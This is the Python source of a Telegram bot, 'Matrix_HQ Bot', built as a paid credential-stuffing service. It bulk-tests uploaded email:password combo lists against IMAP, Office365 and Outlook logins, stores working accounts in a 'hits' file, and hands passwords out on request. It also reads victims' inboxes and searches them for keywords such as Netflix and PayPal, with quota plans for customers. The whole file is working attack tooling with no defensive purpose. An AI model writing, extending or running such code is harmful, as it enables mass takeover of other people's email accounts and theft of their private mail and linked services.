import logging
from pathlib import Path
import yaml
import asyncio
import os
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
import time

from .mail_logic import MailAccessChecker
from .user_db import UserDB

# Load configuration
CONFIG_PATH = Path(__file__).parent / "config.yaml"
if CONFIG_PATH.exists():
    with open(CONFIG_PATH, "r", encoding="utf-8") as f:
        config = yaml.safe_load(f)
else:
    config = {}

BOT_TOKEN = config.get("bot_token", "YOUR_TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = str(config.get("admin_chat_id", "YOUR_ADMIN_CHAT_ID"))

user_db = UserDB(str(Path(__file__).parent / "users.json"))

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Paths to account files (relative to project root)
ACCOUNTS_FILE = Path(__file__).parent.parent / "hits.txt"
VALID_FILE = Path(__file__).parent.parent / "Valid.txt"

def load_accounts(file_path: Path):
    """Load accounts from a file, returning a list of (email, password) tuples."""
    if not file_path.exists():
        return []
    accounts = []
    for line in file_path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line:
            continue
        # Expected format: email:password
        if ":" in line:
            email, pwd = line.split(":", 1)
            accounts.append((email.strip(), pwd.strip()))
    return accounts

ACCOUNTS = load_accounts(ACCOUNTS_FILE)

def get_dashboard_keyboard():
    # Build the base URL for the Mini App
    public_url = os.environ.get('VIEWER_PUBLIC_URL')
    if public_url:
        base_url = public_url if public_url.endswith("/") else public_url + "/"
    else:
        base_url = f"https://{os.environ.get('VIEWER_PUBLIC_IP', '127.0.0.1')}:{os.environ.get('VIEWER_PORT', '3000')}/"
    
    keyboard = [
        [
            InlineKeyboardButton("🔍 Check Emails (All in One Tool)", web_app=WebAppInfo(url=base_url))
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a welcome message when the /start command is issued."""
    msg = "Welcome to <b>Matrix_HQ Bot</b>!\n\nSelect an option below to manage your accounts and scan files."
    reply_markup = get_dashboard_keyboard()
    
    try:
        logo_path = Path(__file__).parent / "logo.jpg"
        if logo_path.exists():
            await update.message.reply_photo(photo=open(logo_path, "rb"), caption=msg, parse_mode="HTML", reply_markup=reply_markup)
        else:
            await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"Failed to send logo: {e}")
        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)

async def dashboard_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    if query.data == "btn_myplan":
        user_id = str(query.from_user.id)
        user = user_db.get_user(user_id)
        text = f"👤 <b>Your Plan</b>: {user['plan']}\n📈 <b>Usage</b>: {user['usage']} combos."
        await query.edit_message_caption(caption=text, parse_mode="HTML", reply_markup=get_dashboard_keyboard())
        
    elif query.data == "btn_accounts":
        total = len(ACCOUNTS)
        text = f"Total valid accounts in memory: {total}\nUse /outlook or /accounts for lists."
        await query.edit_message_caption(caption=text, reply_markup=get_dashboard_keyboard())
        
    elif query.data == "btn_scanner":
        text = "📂 <b>High-Speed Scanner</b>:\nUpload any <code>.txt</code> file to this chat and the bot will automatically extract and test email:password combos for you!"
        await query.edit_message_caption(caption=text, parse_mode="HTML", reply_markup=get_dashboard_keyboard())

    elif query.data == "btn_manual":
        text = "🛠 <b>Manual Checking</b>:\nCheck specific accounts with this command:\n<code>/check_office &lt;email:pass&gt;</code>"
        await query.edit_message_caption(caption=text, parse_mode="HTML", reply_markup=get_dashboard_keyboard())

    elif query.data == "btn_outlook_chk":
        text = "🔑 <b>Outlook Checker</b>:\nVerify Outlook accounts & pull OAuth tokens for OWA.\n<code>/check_outlook &lt;email:pass&gt;</code>"
        await query.edit_message_caption(caption=text, parse_mode="HTML", reply_markup=get_dashboard_keyboard())

    elif query.data == "btn_search_guide":
        text = "🔍 <b>How to Search (OWA/IMAP)</b>:\nUse the following command:\n<code>/search &lt;email&gt; &lt;password&gt; &lt;keyword1,keyword2&gt;</code>\nExample:\n<code>/search test@outlook.com pass123 Netflix,PayPal</code>"
        await query.edit_message_caption(caption=text, parse_mode="HTML", reply_markup=get_dashboard_keyboard())
        
    elif query.data == "btn_viewer":
        import os
        local_ip = os.environ.get("VIEWER_LOCAL_IP", "127.0.0.1")
        public_ip = os.environ.get("VIEWER_PUBLIC_IP", "Unknown")
        port = os.environ.get("VIEWER_PORT", "3000")
        
        text = f"🌐 <b>Mobile Web Viewer</b>:\nThe viewer is running on port {port}.\n\n<b>Local Network URL:</b>\n<code>http://{local_ip}:{port}</code>\n\n<b>Public URL:</b>\n<code>http://{public_ip}:{port}</code>"
        await query.edit_message_caption(caption=text, parse_mode="HTML", reply_markup=get_dashboard_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a help message when the /help command is issued."""
    await update.message.reply_text(
        "Matrix_HQ Commands:\n"
        "/accounts – show total accounts and a sample list\n"
        "/outlook – list Outlook accounts (limited to 20)\n"
        "/view <email> – get password for a specific email\n"
        "/check <email> <password> - verify IMAP access\n"
        "/inbox <email> <password> [limit] - fetch recent emails\n"
        "/check_outlook <email> <password> - verify Outlook OAuth access\n"
        "/search <email> <password> <keyword1,keyword2> - search Outlook inbox\n"
        "Send a .txt file to scan and extract combos automatically."
    )

async def accounts_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Report total number of accounts and show first few samples."""
    total = len(ACCOUNTS)
    sample = "\n".join([f"{e}:{p}" for e, p in ACCOUNTS[:5]]) if ACCOUNTS else "No accounts loaded."
    msg = f"Total accounts: {total}\nSample:\n{sample}"
    await update.message.reply_text(msg)

async def outlook_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List Outlook accounts (limited)."""
    outlook_accounts = [
        (e, p) for e, p in ACCOUNTS
        if e.lower().endswith("@outlook.com")
        or e.lower().endswith("@outlook.fr")
        or e.lower().endswith("@outlook.jp")
        or e.lower().endswith("@outlook.it")
        or e.lower().endswith("@outlook.cl")
        or e.lower().endswith("@outlook.hu")
        or e.lower().endswith("@outlook.kr")
    ]
    if not outlook_accounts:
        await update.message.reply_text("No Outlook accounts found.")
        return
    lines = [f"{e}:{p}" for e, p in outlook_accounts[:20]]
    msg = "Outlook accounts (first 20):\n" + "\n".join(lines)
    await update.message.reply_text(msg)

async def view_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show password for a given email if it exists."""
    if not context.args:
        await update.message.reply_text("Usage: /view <email>")
        return
    email = context.args[0].strip()
    for e, p in ACCOUNTS:
        if e.lower() == email.lower():
            await update.message.reply_text(f"{e}:{p}")
            return
    await update.message.reply_text(f"Account {email} not found.")

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check IMAP credentials."""
    user_id = str(update.effective_user.id)
    ok, err = user_db.check_and_add_usage(user_id, 1)
    if not ok:
        await update.message.reply_text(f"❌ Access Denied:\n{err}")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /check <email> <password>")
        return
    email, password = context.args[0], context.args[1]
    msg = await update.message.reply_text(f"Checking {email}...")
    res = await asyncio.to_thread(MailAccessChecker.check_imap_access, email, password)
    if res.get("accessible"):
        await msg.edit_text(f"✅ Valid: {email}\nServer: {res['details'].get('server')}")
    else:
        await msg.edit_text(f"❌ Invalid: {email}\nError: {res.get('error')}")

async def inbox_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fetch inbox for an account."""
    user_id = str(update.effective_user.id)
    ok, err = user_db.check_and_add_usage(user_id, 1)
    if not ok:
        await update.message.reply_text(f"❌ Access Denied:\n{err}")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /inbox <email> <password> [limit]")
        return
    email, password = context.args[0], context.args[1]
    limit = int(context.args[2]) if len(context.args) > 2 else 5
    msg = await update.message.reply_text(f"Fetching inbox for {email}...")
    res = await asyncio.to_thread(MailAccessChecker.check_inbox_access, email, password, limit)
    
    if res.get("can_read_inbox"):
        count = res.get("message_count", 0)
        text = f"Inbox for {email} ({count} total):\n\n"
        for idx, m in enumerate(res.get("messages", [])):
            text += f"{idx+1}. {m.get('from')} - {m.get('sub')}\n"
        await msg.edit_text(text[:4000]) # Telegram message limit
    else:
        await msg.edit_text(f"❌ Failed to read inbox: {res.get('error')}")

async def mixcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check IMAP credentials (mixed check)."""
    # For now, just run IMAP check as a placeholder for mixed check
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /mixcheck <email> <password>")
        return
    await check_command(update, context)

async def check_office_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /check_office <email> <password>")
        return
    email, password = context.args[0], context.args[1]
    msg = await update.message.reply_text(f"Checking Office365 for {email}...")
    res = await asyncio.to_thread(MailAccessChecker.check_imap_access, email, password, "outlook.office365.com")
    if res.get("accessible"):
        await msg.edit_text(f"✅ Office365 LIVE: {email}")
    else:
        await msg.edit_text(f"❌ Office365 DEAD: {email}")

async def check_outlook_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    ok, err = user_db.check_and_add_usage(user_id, 1)
    if not ok:
        await update.message.reply_text(f"❌ Access Denied:\n{err}")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /check_outlook <email> <password>")
        return
    email, password = context.args[0], context.args[1]
    msg = await update.message.reply_text(f"Checking Outlook OAuth for {email}...")
    res = await asyncio.to_thread(MailAccessChecker.check_outlook_keywords, email, password, [])
    if res.get("accessible"):
        await msg.edit_text(f"✅ Valid Outlook: {email}\nCID: {res.get('cid')}")
    else:
        await msg.edit_text(f"❌ Invalid Outlook: {email}\nError: {res.get('error')}")

async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    ok, err = user_db.check_and_add_usage(user_id, 1)
    if not ok:
        await update.message.reply_text(f"❌ Access Denied:\n{err}")
        return

    if len(context.args) < 3:
        await update.message.reply_text("Usage: /search <email> <password> <keyword1,keyword2>")
        return
    email, password = context.args[0], context.args[1]
    keywords = context.args[2].split(",")
    msg = await update.message.reply_text(f"Searching Outlook for keywords: {keywords}...")
    res = await asyncio.to_thread(MailAccessChecker.check_outlook_keywords, email, password, keywords)
    if res.get("accessible"):
        if res.get("kw_match"):
            await msg.edit_text(f"🔥 KEYWORD MATCH: {email}\nFound {res.get('mails')} matching emails!")
        else:
            await msg.edit_text(f"✅ Valid login, but no matching keywords found.")
    else:
        await msg.edit_text(f"❌ Invalid Outlook: {email}\nError: {res.get('error')}")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        return
    
    msg = await update.message.reply_text("Scanning document for credentials...")
    file = await context.bot.get_file(document.file_id)
    content_bytes = await file.download_as_bytearray()
    content = content_bytes.decode('utf-8', errors='ignore')
    
    import re
    combos = re.findall(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+):([^\s\n]+)', content)
    
    if combos:
        total = len(combos)
        
        # Check quota first
        user_id = str(update.effective_user.id)
        ok, err = user_db.check_and_add_usage(user_id, total)
        if not ok:
            await msg.edit_text(f"❌ Scan blocked due to limits. File contains {total} combos.\n{err}")
            return
            
        added = 0
        hits = 0
        bads = 0
        valid_accounts = []
        
        async def check_combo(email, password):
            try:
                domain = email.split('@')[1].lower()
                if any(x in domain for x in ['outlook', 'hotmail', 'live', 'msn']):
                    res = await asyncio.to_thread(MailAccessChecker.check_outlook_keywords, email, password, [])
                else:
                    res = await asyncio.to_thread(MailAccessChecker.check_imap_access, email, password)
                if res.get("accessible"):
                    return True, email, password
            except: pass
            return False, email, password

        import time
        last_update = time.time()
        
        with open(ACCOUNTS_FILE, "a", encoding="utf-8") as f:
            batch_size = 5
            for i in range(0, total, batch_size):
                batch = combos[i:i+batch_size]
                tasks = [check_combo(e, p) for e, p in batch]
                results = await asyncio.gather(*tasks)
                
                for is_valid, email, password in results:
                    if is_valid:
                        hits += 1
                        valid_accounts.append((email, password))
                        exists = any(e.lower() == email.lower() for e, p in ACCOUNTS)
                        if not exists:
                            ACCOUNTS.append((email, password))
                            f.write(f"{email}:{password}\n")
                            added += 1
                    else:
                        bads += 1
                
                # Update progress max once every 2 seconds to avoid FloodWait
                if time.time() - last_update > 2 or (i + len(batch)) == total:
                    last_update = time.time()
                    processed = i + len(batch)
                    percent = int((processed) / total * 100)
                    bars = int(percent / 10)
                    progress_bar = f"[{'█' * bars}{'░' * (10 - bars)}]"
                    try:
                        await msg.edit_text(f"🔍 <b>Live Scanning...</b>\n{progress_bar} {percent}%\n\n✅ Valid: {hits}\n❌ Bad: {bads}\nProcessed {processed} / {total} combos.", parse_mode="HTML")
                    except:
                        pass # Ignore FloodWait

        # Create inline keyboard for valid accounts
        import os
        local_ip = os.environ.get("VIEWER_LOCAL_IP", "127.0.0.1")
        public_ip = os.environ.get("VIEWER_PUBLIC_IP", "Unknown")
        port = os.environ.get("VIEWER_PORT", "3000")
        
        public_url = os.environ.get('VIEWER_PUBLIC_URL')
        if public_url:
            base_url = public_url if public_url.endswith("/") else public_url + "/"
        else:
            base_url = f"https://{public_ip}:{port}/"
        
        reply_markup = None
        if valid_accounts:
            buttons = []
            for e, p in valid_accounts[:5]: # Show up to 5 quick links
                url = f"{base_url}?email={e}"
                buttons.append([InlineKeyboardButton(f"👁 View {e} (Mini App)", web_app=WebAppInfo(url=url))])
            if len(valid_accounts) > 5:
                buttons.append([InlineKeyboardButton(f"...and {len(valid_accounts)-5} more (See Accounts)", callback_data="btn_accounts")])
            reply_markup = InlineKeyboardMarkup(buttons)
            
        await msg.edit_text(
            f"✅ <b>Scanner Finished!</b>\n\nTotal Checked: {total}\n✅ Hits (Valid): {hits}\n❌ Bad: {bads}\nNew Added to DB: {added}\nYour plan: {user_db.get_user(user_id)['plan']}", 
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    else:
        await msg.edit_text("Scanner finished: No valid email:password combos found.")

async def myplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    user = user_db.get_user(user_id)
    await update.message.reply_text(f"👤 Your Plan: {user['plan']}\nUsage: {user['usage']} combos.")

async def setplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ You are not the admin.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /setplan <chat_id> <FREE|BASIC|VIP>")
        return
    target_id, new_plan = context.args[0], context.args[1]
    user_db.set_plan(target_id, new_plan)
    await update.message.reply_text(f"✅ User {target_id} updated to {new_plan.upper()}.")

def run_bot() -> None:
    """Start the Telegram bot using the configured token."""
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        logger.error("Bot token not set in config.yaml. Exiting.")
        return
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("dashboard", start))
    app.add_handler(CallbackQueryHandler(dashboard_callback))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("accounts", accounts_command))
    app.add_handler(CommandHandler("outlook", outlook_command))
    app.add_handler(CommandHandler("view", view_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("inbox", inbox_command))
    app.add_handler(CommandHandler("mixcheck", mixcheck_command))
    app.add_handler(CommandHandler("check_outlook", check_outlook_command))
    app.add_handler(CommandHandler("check_office", check_office_command))
    app.add_handler(CommandHandler("search", search_command))
    app.add_handler(CommandHandler("myplan", myplan_command))
    app.add_handler(CommandHandler("setplan", setplan_command))
    
    from telegram.ext import MessageHandler, filters
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    logger.info("Matrix_HQ Bot is starting...")
    # NOTE: run_polling is blocking.
    app.run_polling()

if __name__ == "__main__":
    run_bot()
